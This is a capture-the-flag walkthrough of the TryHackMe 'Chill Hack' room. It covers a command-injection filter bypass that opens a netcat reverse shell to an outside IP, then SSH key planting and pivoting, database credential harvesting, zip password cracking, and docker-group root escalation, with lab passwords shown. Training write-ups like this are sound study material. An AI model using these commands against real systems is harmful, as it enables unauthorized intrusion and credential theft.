# Chill Hack

**Room Link:** [https://tryhackme.com/room/chillhack](https://tryhackme.com/room/chillhack)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (28) (4).png" alt=""><figcaption></figcaption></figure>



A lot of commands ran will result in this page.

<figure><img src="../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>

### Command Injection

Used this to find a way to bypass the filter. by adding a \ in the middle of the first command, it treats the command as a new line so it allows us to run any command we want.

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)&#x20;



**Web**

```
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.186 1337 >/tmp/f
```

**Kali**

```
nc -lvnp 1337
```

**Victim**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (37) (2).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -u apaar /home/apaar/.helpline.sh
/bin/bash
/bin/bash
```

<figure><img src="../../.gitbook/assets/image (21) (4).png" alt=""><figcaption></figcaption></figure>

**Victim(apaar)**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Victim(apaar)**

```
netstat -at
curl localhost:9001
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18) (9).png" alt=""><figcaption></figcaption></figure>

### Pivot

**Kali**

```
ssh-keygen -t rsa
cat /root/.ssh/id_rsa.pub
```

**Victim**

```
copy id_rsa.pub to /home/apaar/.ssh/authorized_keys
```

**Kali**

```
vi /etc/proxychains.conf
```

**proxychains.conf**

```
socks4 	127.0.0.1 9050
```

**Kali**

```
ssh -D 9050 apaar@VICTIM
```

<figure><img src="../../.gitbook/assets/image (42) (2).png" alt=""><figcaption></figcaption></figure>



I can now see the webpage from Kali but no login credentials to use.

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Found credentials for mysql in one of the php files.

**Victim(apaar)**

```
cat /var/www/files/index.php
```

<figure><img src="../../.gitbook/assets/image (27) (6).png" alt=""><figcaption></figcaption></figure>

**Victim(apaar)**

```
mysql -u root -p webportal
Password: !@m+her00+@db
```

**Victim(mysql)**

```
SHOW DATABASES;
use webportal;
SHOW TABLES;
select * from users;
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (14) (11).png" alt=""><figcaption></figcaption></figure>



Both set of credentials work on the login page, both bring up this page.

<figure><img src="../../.gitbook/assets/image (32) (1).png" alt=""><figcaption></figcaption></figure>

Used no password

**Kali**

```
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

<figure><img src="../../.gitbook/assets/image (17) (6) (2).png" alt=""><figcaption></figcaption></figure>

### Cracking Password Protected Zip Files

**Kali**

```
zip2john backup.zip > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt 
```

<figure><img src="../../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
unzip backup.zip
Password: pass1word
```

<figure><img src="../../.gitbook/assets/image (24) (7).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cat source_code.php 
echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (36) (2).png" alt=""><figcaption></figcaption></figure>

**Victim(apaar)**

<pre><code>su anurodh
<strong>Password: !d0ntKn0wmYp@ssw0rd
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

anurodh is apart of a docker group which the other user was not apart of, looking at gtfo bins theres a way to get a shell so I tried it and got root

**Link:** [https://gtfobins.github.io/gtfobins/docker/#shell](https://gtfobins.github.io/gtfobins/docker/#shell)

**Victim(anurodh)**

```
groups
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<figure><img src="../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>









